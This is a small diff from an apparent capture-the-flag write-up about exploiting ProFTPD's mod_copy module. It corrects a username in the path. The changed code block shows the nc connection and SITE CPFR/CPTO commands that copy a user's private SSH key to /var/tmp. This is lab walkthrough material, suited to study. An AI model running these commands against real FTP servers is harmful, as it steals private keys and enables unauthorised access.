@@ -74,7 +74,7 @@ The search shows four weaknesses, the exploit we're going to target is the mod_c
 
 ```python
 nc <ip> 21
-SITE CPFR /home/enobi/.ssh/id_rsa
+SITE CPFR /home/kenobi/.ssh/id_rsa
 SITE CPTO /var/tmp/id_rsa
 ```
 
